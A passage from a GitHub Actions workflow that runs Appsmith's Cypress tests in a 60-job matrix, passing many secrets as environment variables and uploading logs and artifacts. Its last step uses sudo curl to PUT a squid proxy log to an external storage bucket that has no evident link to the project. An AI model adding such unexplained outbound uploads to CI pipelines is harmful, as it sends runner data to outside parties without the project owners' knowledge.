        CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_ID: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_ID
          }}
        CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_SECRET: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_SECRET
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_AUTH_URL: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_AUTH_URL
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_ID: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_ID
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_SECRET: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_SECRET
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_JWKS_URL: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_JWKS_URL
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_TOKEN_URL: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_TOKEN_URL
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_USER_INFO: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_USER_INFO
          }}
        CYPRESS_BROWSER: ${{ env.BROWSER_PATH }}
        CYPRESS_CONFIG_FILE: cypress_ci_custom.config.ts
        CYPRESS_DB_HOST: ${{ secrets.CYPRESS_DB_HOST }}
        CYPRESS_DB_NAME: ${{ secrets.CYPRESS_DB_NAME }}
        CYPRESS_DB_PWD: ${{ secrets.CYPRESS_DB_PWD }}
        CYPRESS_DB_USER: ${{ secrets.CYPRESS_DB_USER }}
        CYPRESS_ENV: NODE_ENV=development
        CYPRESS_EXCLUDE_TAGS: airgap
        CYPRESS_FIRESTORE_PRIVATE_KEY: ${{ secrets.FIRESTORE_PRIVATE_KEY }}
        CYPRESS_GITEA_TOKEN: ${{ secrets.GITEA_TOKEN }}
        CYPRESS_GITHUB_PERSONAL_ACCESS_TOKEN: ${{ secrets.CYPRESS_GITHUB_PERSONAL_ACCESS_TOKEN
          }}
        CYPRESS_HEADLESS: 'true'
        CYPRESS_OAUTH_SAML_EMAIL: ${{ secrets.CYPRESS_OAUTH_SAML_EMAIL }}
        CYPRESS_OAUTH_SAML_ENTITY_ID: ${{ secrets.CYPRESS_OAUTH_SAML_ENTITY_ID }}
        CYPRESS_OAUTH_SAML_METADATA_URL: ${{ secrets.CYPRESS_OAUTH_SAML_METADATA_URL
          }}
        CYPRESS_OAUTH_SAML_METADATA_XML: ${{ secrets.CYPRESS_OAUTH_SAML_METADATA_XML
          }}
        CYPRESS_OAUTH_SAML_PUB_CERT: ${{ secrets.CYPRESS_OAUTH_SAML_PUB_CERT }}
        CYPRESS_OAUTH_SAML_REDIRECT_URL: ${{ secrets.CYPRESS_OAUTH_SAML_REDIRECT_URL
          }}
        CYPRESS_OAUTH_SAML_SSO_URL: ${{ secrets.CYPRESS_OAUTH_SAML_SSO_URL }}
        CYPRESS_PASSWORD: ${{ secrets.CYPRESS_PASSWORD }}
        CYPRESS_S3_ACCESS: ${{ secrets.CYPRESS_S3_ACCESS }}
        CYPRESS_S3_ACCESS_KEY: ${{ secrets.CYPRESS_S3_ACCESS_KEY }}
        CYPRESS_S3_SECRET: ${{ secrets.CYPRESS_S3_SECRET }}
        CYPRESS_S3_SECRET_KEY: ${{ secrets.CYPRESS_S3_SECRET_KEY }}
        CYPRESS_SPEC_PATTERN: cypress/e2e/**/**/*
        CYPRESS_TESTPASSWORD1: ${{ secrets.CYPRESS_TESTPASSWORD1 }}
        CYPRESS_TESTPASSWORD2: ${{ secrets.CYPRESS_TESTPASSWORD1 }}
        CYPRESS_TESTPASSWORD3: ${{ secrets.CYPRESS_TESTPASSWORD3 }}
        CYPRESS_TESTPASSWORD4: ${{ secrets.CYPRESS_TESTPASSWORD4 }}
        CYPRESS_TESTUSERNAME1: ${{ secrets.CYPRESS_TESTUSERNAME1 }}
        CYPRESS_TESTUSERNAME2: ${{ secrets.CYPRESS_TESTUSERNAME2 }}
        CYPRESS_TESTUSERNAME3: ${{ secrets.CYPRESS_TESTUSERNAME3 }}
        CYPRESS_TESTUSERNAME4: ${{ secrets.CYPRESS_TESTUSERNAME4 }}
        CYPRESS_TEST_GITHUB_USER_NAME: ${{ secrets.CYPRESS_TEST_GITHUB_USER_NAME }}
        CYPRESS_USERNAME: ${{ secrets.CYPRESS_USERNAME }}
        CYPRESS_VERIFY_TIMEOUT: 100000
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        REPOSITORY: ${{ github.repository }}
        RUNID: ${{ github.run_id }}
        TAG: ${{ github.event_name }}
        THIS_RUNNER: ${{ strategy.job-index }}
        TOTAL_RUNNERS: ${{ strategy.job-total }}
      id: cypress_test
      if: steps.run_result.outputs.run_result != 'success' && steps.run_result.outputs.run_result
        != 'failedtest'
      name: Run the cypress test
      uses: cypress-io/github-action@v5
      with:
        command: yarn ts-node --require esm cypress/cypress-split.ts
        install: false
        working-directory: app/client
    - continue-on-error: true
      env:
        APPSMITH_DISABLE_TELEMETRY: true
        APPSMITH_GOOGLE_MAPS_API_KEY: ${{ secrets.APPSMITH_GOOGLE_MAPS_API_KEY }}
        ATTEMPT_NUMBER: ${{ github.run_attempt }}
        BRANCH: ${{ env.COMMIT_INFO_BRANCH }}
        COMMITTER: ${{ env.COMMIT_INFO_AUTHOR }}
        COMMIT_INFO_MESSAGE: ${{ env.COMMIT_INFO_MESSAGE }}
        CYPRESS_AIRGAPPED: false
        CYPRESS_AIRTABLE_BEARER: ${{ secrets.AIRTABLE_BEARER }}
        CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_ID: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_ID
          }}
        CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_SECRET: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GITHUB_CLIENT_SECRET
          }}
        CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_ID: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_ID
          }}
        CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_SECRET: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_GOOGLE_CLIENT_SECRET
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_AUTH_URL: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_AUTH_URL
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_ID: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_ID
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_SECRET: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_CLIENT_SECRET
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_JWKS_URL: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_JWKS_URL
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_TOKEN_URL: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_TOKEN_URL
          }}
        CYPRESS_APPSMITH_OAUTH2_OIDC_USER_INFO: ${{ secrets.CYPRESS_APPSMITH_OAUTH2_OIDC_USER_INFO
          }}
        CYPRESS_BROWSER: ${{ env.BROWSER_PATH }}
        CYPRESS_CONFIG_FILE: cypress_ci.config.ts
        CYPRESS_DB_HOST: ${{ secrets.CYPRESS_DB_HOST }}
        CYPRESS_DB_NAME: ${{ secrets.CYPRESS_DB_NAME }}
        CYPRESS_DB_PWD: ${{ secrets.CYPRESS_DB_PWD }}
        CYPRESS_DB_USER: ${{ secrets.CYPRESS_DB_USER }}
        CYPRESS_ENV: NODE_ENV=development
        CYPRESS_EXCLUDE_TAGS: airgap
        CYPRESS_FIRESTORE_PRIVATE_KEY: ${{ secrets.FIRESTORE_PRIVATE_KEY }}
        CYPRESS_GITEA_TOKEN: ${{ secrets.GITEA_TOKEN }}
        CYPRESS_GITHUB_PERSONAL_ACCESS_TOKEN: ${{ secrets.CYPRESS_GITHUB_PERSONAL_ACCESS_TOKEN
          }}
        CYPRESS_HEADLESS: 'true'
        CYPRESS_OAUTH_SAML_EMAIL: ${{ secrets.CYPRESS_OAUTH_SAML_EMAIL }}
        CYPRESS_OAUTH_SAML_ENTITY_ID: ${{ secrets.CYPRESS_OAUTH_SAML_ENTITY_ID }}
        CYPRESS_OAUTH_SAML_METADATA_URL: ${{ secrets.CYPRESS_OAUTH_SAML_METADATA_URL
          }}
        CYPRESS_OAUTH_SAML_METADATA_XML: ${{ secrets.CYPRESS_OAUTH_SAML_METADATA_XML
          }}
        CYPRESS_OAUTH_SAML_PUB_CERT: ${{ secrets.CYPRESS_OAUTH_SAML_PUB_CERT }}
        CYPRESS_OAUTH_SAML_REDIRECT_URL: ${{ secrets.CYPRESS_OAUTH_SAML_REDIRECT_URL
          }}
        CYPRESS_OAUTH_SAML_SSO_URL: ${{ secrets.CYPRESS_OAUTH_SAML_SSO_URL }}
        CYPRESS_PASSWORD: ${{ secrets.CYPRESS_PASSWORD }}
        CYPRESS_S3_ACCESS: ${{ secrets.CYPRESS_S3_ACCESS }}
        CYPRESS_S3_ACCESS_KEY: ${{ secrets.CYPRESS_S3_ACCESS_KEY }}
        CYPRESS_S3_SECRET: ${{ secrets.CYPRESS_S3_SECRET }}
        CYPRESS_S3_SECRET_KEY: ${{ secrets.CYPRESS_S3_SECRET_KEY }}
        CYPRESS_TESTPASSWORD1: ${{ secrets.CYPRESS_TESTPASSWORD1 }}
        CYPRESS_TESTPASSWORD2: ${{ secrets.CYPRESS_TESTPASSWORD1 }}
        CYPRESS_TESTPASSWORD3: ${{ secrets.CYPRESS_TESTPASSWORD3 }}
        CYPRESS_TESTPASSWORD4: ${{ secrets.CYPRESS_TESTPASSWORD4 }}
        CYPRESS_TESTUSERNAME1: ${{ secrets.CYPRESS_TESTUSERNAME1 }}
        CYPRESS_TESTUSERNAME2: ${{ secrets.CYPRESS_TESTUSERNAME2 }}
        CYPRESS_TESTUSERNAME3: ${{ secrets.CYPRESS_TESTUSERNAME3 }}
        CYPRESS_TESTUSERNAME4: ${{ secrets.CYPRESS_TESTUSERNAME4 }}
        CYPRESS_TEST_GITHUB_USER_NAME: ${{ secrets.CYPRESS_TEST_GITHUB_USER_NAME }}
        CYPRESS_USERNAME: ${{ secrets.CYPRESS_USERNAME }}
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        REPOSITORY: ${{ github.repository }}
        RUNID: ${{ github.run_id }}
        TAG: ${{ github.event_name }}
        THIS_RUNNER: ${{ strategy.job-index }}
      id: cypress_test_failedtest
      if: steps.run_result.outputs.run_result == 'failedtest'
      name: Run the cypress test with failed tests
      uses: cypress-io/github-action@v5
      with:
        command: yarn cypress run --browser ${{ env.BROWSER_PATH }} --config-file
          cypress_ci_custom.config.ts --spec ${{ env.failed_spec_env }}
        install: false
        working-directory: app/client
    - continue-on-error: true
      if: failure()
      name: Collect CI container logs
      run: 'mkdir -p  ~/dockerlogs

        docker logs appsmith 2>&1 > ~/dockerlogs/dockerlogs-${{ matrix.job }}.txt

        '
      working-directory: .
    - continue-on-error: true
      if: failure()
      name: Upload failed test list artifact
      uses: actions/upload-artifact@v3
      with:
        name: dockerlogs
        path: ~/dockerlogs
    - continue-on-error: true
      if: always()
      name: Rename reports
      run: 'mkdir -p ~/results

        mv ${{ github.workspace }}/app/client/results ~/results/${{ matrix.job }}

        '
    - continue-on-error: true
      if: always()
      name: Upload cypress report
      uses: actions/upload-artifact@v3
      with:
        name: results-${{github.run_attempt}}
        path: ~/results
    - continue-on-error: true
      if: failure()
      name: Set fail if there are test failures
      run: 'echo "run_result=failedtest" >> $GITHUB_OUTPUT

        echo "failedtest" > ~/run_result

        '
    - continue-on-error: true
      if: always()
      name: Create directory for failed tests
      run: 'mkdir -p ~/failed_spec_ci-${{github.run_attempt}}

        '
    - continue-on-error: true
      if: failure()
      name: In case of test failures copy them to a file
      run: 'cd ${{ github.workspace }}/app/client/cypress/

        find screenshots -type f \( -iname "*\(attempt 2\).png" -o -iname "*before
        all hook*" -o -iname "*after all hook*" \) | sed ''s/screenshots/cypress\/e2e/g''|
        sed ''s:/[^/]*$::'' | sort -u > ~/failed_spec_ci-${{github.run_attempt}}/failed_spec_ci-${{
        matrix.job }}

        '
    - continue-on-error: true
      if: failure()
      name: Upload failed test list artifact
      uses: actions/upload-artifact@v3
      with:
        name: failed-spec-ci-${{github.run_attempt}}
        path: ~/failed_spec_ci-${{github.run_attempt}}
    - continue-on-error: true
      if: failure()
      name: Store the previous run result
      uses: actions/cache/save@v3
      with:
        key: ${{ github.run_id }}-${{ github.job }}-${{ matrix.job }}
        path: '~/run_result

          '
    - continue-on-error: true
      id: dashboard_url
      if: always()
      name: get cypress url dashboard url
      run: "if [[ \"${{steps.run_result.outputs.run_result }}\" != \"success\"  &&\
        \  \"${{steps.run_result.outputs.run_result }}\" != \"failedtest\" ]]; then\n\
        \  echo \"\" >> ~/cypress_url\nelif [[ \"${{steps.run_result.outputs.run_result\
        \ }}\" == \"failedtest\" ]]; then\n  echo \"\" >> ~/cypress_url\nfi\n"
    - continue-on-error: true
      if: success()
      name: Store the previous run result
      uses: actions/cache/save@v3
      with:
        key: ${{ github.run_id }}-dashboard-url-${{ github.run_number }}
        path: '~/cypress_url

          '
    - continue-on-error: true
      if: failure()
      name: Upload server logs bundle on failure
      uses: actions/upload-artifact@v3
      with:
        name: server-logs-${{ matrix.job }}
        path: app/server/server-logs.log
    - continue-on-error: true
      name: Save the status of the run
      run: 'echo "run_result=success" >> $GITHUB_OUTPUT

        echo "success" > ~/run_result

        '
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/aivanis/appsmith.$(date
        +%s)
    strategy:
      fail-fast: false
      matrix:
        job:
        - 0
        - 1
        - 2
        - 3
        - 4
        - 5
        - 6
        - 7
        - 8
        - 9
        - 10
        - 11
        - 12
        - 13
        - 14
        - 15
        - 16
        - 17
        - 18
        - 19
        - 20
        - 21
        - 22
        - 23
        - 24
        - 25
        - 26
        - 27
        - 28
        - 29
        - 30
        - 31
        - 32
        - 33
        - 34
        - 35
        - 36
        - 37
        - 38
        - 39
        - 40
        - 41
        - 42
        - 43
        - 44
        - 45
        - 46
        - 47
        - 48
        - 49
        - 50
        - 51
        - 52
        - 53
        - 54
        - 55
        - 56
        - 57
        - 58
        - 59
    timeout-minutes: 60
name: Appsmith CI Test (with DocumentDB) Workflow
'on':
  workflow_dispatch: {}
